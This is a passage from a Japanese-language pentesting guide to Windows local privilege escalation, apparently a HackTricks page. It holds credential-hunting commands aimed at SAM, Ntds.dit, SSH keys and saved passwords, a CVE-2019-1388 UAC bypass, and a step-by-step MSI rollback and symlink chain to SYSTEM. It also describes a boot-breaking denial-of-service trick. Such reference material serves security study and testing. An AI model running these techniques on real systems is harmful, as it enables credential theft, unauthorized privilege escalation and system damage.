%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
すべての提案されたファイルを検索してください:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の資格情報

Bin も確認して、その中に資格情報がないか探すべきです

複数のプログラムによって保存された**パスワードを回復**するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報を含む可能性のあるその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリから openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome or Firefox** に保存されているパスワードの dbs を確認してください。\
また、ブラウザの history、bookmarks、favourites も確認してください。そこに **passwords** が保存されているかもしれません。

ブラウザから passwords を抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、Windows オペレーティングシステムに組み込まれた技術で、異なる言語のソフトウェアコンポーネント間の **intercommunication** を可能にします。各 COM コンポーネントは **class ID (CLSID)** によって識別され、各コンポーネントは 1 つ以上の interfaces を公開し、それらは interface IDs (IIDs) によって識別されます。

COM classes と interfaces は、レジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** にそれぞれ定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** をマージして作成されます。

このレジストリの CLSIDs の中には、子レジストリ **InProcServer32** があり、そこには **DLL** を指す **default value** と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) になり得る **ThreadingModel** という値があります。

![](<../../images/image (729).png>)

要するに、実行される予定の **DLLs** のいずれかを **overwrite** できるなら、その DLL が別のユーザーによって実行される場合に **privileges** を **escalate** できます。

攻撃者が永続化の仕組みとして COM Hijacking をどのように使うかを学ぶには、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の Generic Password search**

**ファイル内容を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名のファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** プラグインです。私はこのプラグインを作成し、**被害者内で認証情報を検索するすべての metasploit POST module を自動的に実行**するようにしました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するためのもう1つの優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、平文でこのデータを保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の**sessions**、**usernames**、**passwords** を検索するツールです。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM** で動作するプロセスが、新しいプロセスを **OpenProcess()** で **full access** 付きで開くと想像してください。  
同じプロセスが、**低権限だがメインプロセスの open handles をすべて継承する** 新しいプロセスを **CreateProcess()** で作成します。\
その後、**低権限プロセスに対して full access** を持っていれば、`OpenProcess()` で作成された **特権プロセスへの open handle** を取得して、**shellcode を inject** できます。\
[この脆弱性の **検出方法と悪用方法** の詳細は、この例を読んでください。](leaked-handle-exploitation.md)\
[**異なる権限レベルで継承されたプロセスや thread の他の open handlers を、より包括的にテストして悪用する方法** の詳しい説明については、この **別の投稿** を読んでください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントは、プロセス間通信とデータ転送を可能にします。

Windows には **Named Pipes** という機能があり、無関係なプロセス同士でも、異なるネットワークをまたいでデータを共有できます。これは、役割が **named pipe server** と **named pipe client** に分かれたクライアント/サーバー構成に似ています。

**client** が pipe を通じてデータを送ると、その pipe をセットアップした **server** は、必要な **SeImpersonate** 権限があれば **client の identity を引き受ける** ことができます。pipe 経由で通信する **特権プロセス** を特定でき、それを模倣できるなら、自分が作成した pipe と相互作用した際にそのプロセスの identity を採用することで、**より高い権限を取得** できます。この攻撃の実行方法については、[**ここ**](named-pipe-client-impersonation.md) と [**ここ**](#from-high-integrity-to-system) に役立つガイドがあります。

また、以下のツールを使うと、**burp のようなツールで named pipe communication を intercept** できます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **さらにこのツールは、すべての pipe を一覧表示して確認し、privescs を見つけることができます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony サービス (TapiSrv) の server mode は `\\pipe\\tapsrv` (MS-TRP) を公開します。remote authenticated client は mailslot ベースの async event path を悪用して `ClientAttach` を任意の **4-byte write** に変え、`NETWORK SERVICE` が書き込み可能な既存の任意ファイルに書き込ませ、その後 Telephony の admin rights を取得して、service として任意の DLL を load できます。全体の流れは次のとおりです:

- `pszDomainUser` を書き込み可能な既存パスに設定して `ClientAttach` → サービスは `CreateFileW(..., OPEN_EXISTING)` でそれを開き、async event writes に使用する
- 各 event は `Initialize` の attacker-controlled `InitContext` をその handle に書き込む。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) をトリガーし、`GetAsyncEvents` (`Req_Func 0`) で取得し、その後 unregister/shutdown して deterministic writes を繰り返す
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して reconnect し、任意の DLL path を指定して `GetUIDllName` を呼び出し、`TSPI_providerUIIdentify` を `NETWORK SERVICE` として実行する

詳細はここ:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows で stuff を実行できる File Extensions

**[https://filesec.io/](https://filesec.io/)** のページを確認してください

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` に渡されるクリック可能な Markdown リンクは、危険な URI handlers (`file:`, `ms-appinstaller:` または登録済みの任意の scheme) をトリガーし、attacker-controlled files を現在のユーザーとして実行できることがあります。詳細は:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

ユーザーとして shell を取得したとき、credentials を command line で渡す scheduled tasks や他の process が実行されている可能性があります。以下の script は、process command lines を 2 秒ごとに取得し、現在の状態を前回の状態と比較して、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース (コンソールまたは RDP 経由) にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルや "NT\AUTHORITY SYSTEM" のような任意のプロセスを実行できることがあります。

これにより、同じ脆弱性を使って特権昇格と UAC のバイパスを同時に行うことが可能になります。さらに、何かをインストールする必要はなく、処理中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムのいくつかは以下のとおりです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を exploit するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium から High Integrity Level / UAC Bypass へ

Integrity Levels について学ぶには、これを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、UAC と UAC bypass について学ぶには、これを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**この blog post で**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) 説明されている technique で、[**利用可能な exploit code はここ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) にあります。

この attack は基本的に、Windows Installer の rollback 機能を悪用して、uninstallation process 中に正規の file を malicious なものに置き換えるものです。そのために attacker は、`C:\Config.Msi` フォルダを hijack するために使われる **malicious MSI installer** を作成する必要があります。その後、Windows Installer が他の MSI packages の uninstallation 中に rollback files を保存する際にそのフォルダが使われ、rollback files が malicious payload を含むように改変されます。

要約すると、この technique は次のとおりです:

1. **Stage 1 – Preparing for the Hijack (`C:\Config.Msi` を空にしておく)**

- Step 1: Install the MSI
- `.msi` を作成し、書き込み可能な folder (`TARGETDIR`) に無害な file (例: `dummy.txt`) を install する。
- installer を **"UAC Compliant"** としてマークし、**non-admin user** が実行できるようにする。
- install 後、その file の **handle** を開いたままにする。

- Step 2: Begin Uninstall
- 同じ `.msi` を uninstall する。
- uninstall process は file を `C:\Config.Msi` に移動し始め、`.rbf` file (rollback backups) に rename する。
- `GetFinalPathNameByHandle` を使って開いている file handle を **poll** し、その file が `C:\Config.Msi\<random>.rbf` になったタイミングを検出する。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれている:
- `.rbf` が書き込まれたことを signal する。
- その後、続行する前に別の event を **wait** する。

- Step 4: Block Deletion of `.rbf`
- signal されたら、`FILE_SHARE_DELETE` なしで `.rbf` file を開く — これにより **削除できなくなる**。
- その後、uninstall を完了できるように back で signal する。
- Windows Installer は `.rbf` を削除できず、すべての contents を削除できないため、**`C:\Config.Msi` は削除されない**。

- Step 5: Manually Delete `.rbf`
- attacker であるあなたが `.rbf` file を手動で削除する。
- これで **`C:\Config.Msi` は空** になり、hijack の準備が整う。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability** を発動して `C:\Config.Msi` を削除します。

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- `C:\Config.Msi` folder を自分で再作成する。
- **weak DACLs** (例: Everyone:F) を設定し、`WRITE_DAC` を持つ **handle** を開いたままにする。

- Step 7: Run Another Install
- `.msi` を再度 install する。条件は:
- `TARGETDIR`: 書き込み可能な location。
- `ERROROUT`: 強制失敗を発生させる variable。
- この install は、再び **rollback** を発生させるために使われ、`.rbs` と `.rbf` を読み取る。

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` を使い、`C:\Config.Msi` に新しい `.rbs` が現れるまで監視する。
- その filename を取得する。

- Step 9: Sync Before Rollback
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれている:
- `.rbs` が作成されたときに event を signal する。
- その後、続行する前に **wait** する。

- Step 10: Reapply Weak ACL
- `.rbs created` event を受信した後:
- Windows Installer は `C:\Config.Msi` に **strong ACLs** を再適用する。
- しかし `WRITE_DAC` を持つ handle をまだ持っているので、**weak ACLs を再適用** できる。

> ACLs は **handle open 時にのみ強制される** ので、folder への書き込みは引き続き可能です。

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` file を上書きし、Windows に次を指示する **fake rollback script** を入れる:
- あなたの `.rbf` file (malicious DLL) を、**privileged location** (例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) に restore する。
- **malicious SYSTEM-level payload DLL** を含む fake `.rbf` を配置する。

- Step 12: Trigger the Rollback
- sync event を signal して installer を再開させる。
- **type 19 custom action (`ErrorOut`)** が、既知の時点で install を**意図的に失敗**させるよう設定されている。
- これにより **rollback が開始** される。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- あなたの malicious `.rbs` を読み込む。
- `.rbf` DLL を target location にコピーする。
- これで、**SYSTEM-loaded path** に malicious DLL が配置される。

- Final Step: Execute SYSTEM Code
- trusted な **auto-elevated binary** (例: `osk.exe`) を実行し、hijack した DLL を load させる。
- **Boom**: あなたの code が **SYSTEM として** 実行される。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

主要な MSI rollback technique (前のもの) は、**folder 全体** (例: `C:\Config.Msi`) を削除できることを前提としています。では、vulnerability が **arbitrary file deletion** しか許さない場合はどうでしょうか？

**NTFS internals** を悪用できます。すべての folder には次の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームは、フォルダの**index metadata**を保存します。

そのため、フォルダの `::$INDEX_ALLOCATION` ストリームを**削除**すると、NTFS はそのフォルダ**全体を filesystem から削除**します。

これを行うには、次のような標準の file deletion APIs を使えます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* の delete API を呼んでいても、実際には **folder 自体を削除します**。

### From Folder Contents Delete to SYSTEM EoP
もしあなたの primitive で任意の file/folder を削除できなくても、**攻撃者が制御する folder の *contents* を削除することはできる** 場合はどうでしょうか？

1. Step 1: bait folder と file を setup する
- Create: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を置く
- privileged process が `file1.txt` を delete しようとすると、oplock が **execution を pause します**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process をトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガー**され、処理があなたの callback に渡されます。

4. Step 4: oplock callback 内で – 削除をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより oplock を壊さずに `folder1` が空になります。
- `file1.txt` を直接削除しないでください — そうすると oplock が早すぎるタイミングで解放されます。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これは、フォルダのメタデータを保存する NTFS 内部ストリームを対象にしています — それを削除するとフォルダ自体が削除されます。

5. Step 5: oplock を解放する
- SYSTEM プロセスは続行し、`file1.txt` を削除しようとします。
- しかし今では、junction + symlink により、実際には次を削除しています:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` は SYSTEM により削除されます。

### 任意フォルダ作成から永続的な DoS へ

**ファイルを書き込めない**、または **弱い権限を設定できない** 場合でも、**SYSTEM/admin として任意のフォルダを作成できる** primitive を悪用します。

**ファイル** ではなく **フォルダ** を、**重要な Windows driver** の名前で作成します。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` の kernel-mode driver に対応します。
- これを**事前に folder として作成**すると、Windows は boot 時に実際の driver を load できなくなります。
- その後、Windows は boot 中に `cng.sys` を load しようとします。
- folder を検出し、**実際の driver を解決できず**、**crash するか boot を停止**します。
- **fallback はなく**、外部介入（例: boot repair や disk access）がない限り**復旧できません**。

### privileged な log/backup path + OM symlinks から arbitrary file overwrite / boot DoS へ

**privileged service** が **writable config** から読み込んだ path に log/export を書き込む場合、**Object Manager symlinks + NTFS mount points** でその path を redirect し、privileged write を arbitrary overwrite に変えられます（**SeCreateSymbolicLinkPrivilege なし**でも可能）。

**Requirements**
- target path を保存する config が attacker から書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- その path に書き込む privileged operation があること（log, export, report）。

**Example chain**
1. config を読み、privileged log destination を取得する。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin なしで path を redirect する:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例: admin が "send test SMS" をトリガーする）。書き込みは `C:\Windows\System32\cng.sys` に入る。
4. 上書きされた対象を確認する（hex/PE parser）して破損を確かめる。再起動すると Windows は改変された driver path を読み込もうとする → **boot loop DoS**。これは、特権サービスが write で開く protected file 全般にも一般化できる。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれるが、`C:\Windows\System32\cng.sys` に copy が存在するとそちらが先に試される可能性があり、破損データの reliable DoS sink として使える。



## **From High Integrity to System**

### **New service**

すでに High Integrity process 上で動いているなら、**SYSTEM への path** は、新しい service を**作成して実行する**だけで簡単なことがある:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービスバイナリを作成する際は、それが有効な service であること、または binary が必要な処理を十分速く実行することを確認してください。そうしないと、20s で kill されます。

### AlwaysInstallElevated

High Integrity process から **AlwaysInstallElevated registry entries を有効化**して、_**.msi**_ wrapper を使って reverse shell を **install** できます。\
[関連する registry keys と _.msi_ package の install 方法の詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードはこちらを** [**参照**](seimpersonate-from-high-to-system.md)**してください。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges がある場合（おそらく High Integrity process で見つかるでしょう）、SeDebug privilege により **ほぼ任意の process**（protected processes 以外）を **open** でき、その process の token を **copy** して、その token で **arbitrary process を作成**できます。\
この technique では通常、**全 token privileges を持つ SYSTEM で動作している任意の process** が **selected** されます（_はい、SYSTEM processes の中には全 token privileges を持たないものもあります_）。\
**提案された technique を実行する code example は** [**こちら**](sedebug-+-seimpersonate-copy-token.md)**です。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation する際に使います。手法は、**pipe を作成し、その pipe に書き込む service を create/abuse する** というものです。すると、**`SeImpersonate`** privilege を使って pipe を作成した **server** は、pipe client（service）の **token を impersonate** でき、SYSTEM privileges を取得できます。\
name pipes について [**さらに学ぶにはこれを読んでください**](#named-pipe-client-impersonation)。\
high integrity から name pipes を使って System に移行する例を読みたい場合は [**これを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**process** が **SYSTEM** として動作しているときに **読み込まれる dll を hijack** できれば、その権限で arbitrary code を実行できます。したがって Dll Hijacking もこの種の privilege escalation に有用であり、さらに **high integrity process からはより簡単に達成**できます。これは、dll を読み込むために使われるフォルダに **write permissions** を持つためです。\
**Dll hijacking については** [**こちらでさらに学べます**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための最良の tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files をチェック (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な misconfigurations をチェックし、情報を収集 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations をチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の保存済み session information を抽出します。local では -Thorough を使ってください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から crendentials を抽出します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 集めた passwords を domain 全体に spray します**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell の ADIDNS/LLMNR/mDNS spoofer 兼 man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索します（DEPRECATED、Watson に置き換え）。\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索します（VisualStudio で compile する必要があります） ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を探して host を enumerate します（privesc ツールというより情報収集ツールです）（compile が必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くの software から credentials を抽出します（github に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# 版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration をチェックします（github に executable precompiled あり）。推奨しません。Win10 ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な misconfigurations をチェックします（python から exe を生成）。推奨しません。Win10 ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post を元に作成された tool です（正しく動作させるのに accesschk は不要ですが、使うことはできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作する exploits を提案します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作する exploits を提案します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しいバージョンの .NET を使って project を compile する必要があります（[これを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/))。victim host にインストールされている .NET の version を確認するには、次を実行できます：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
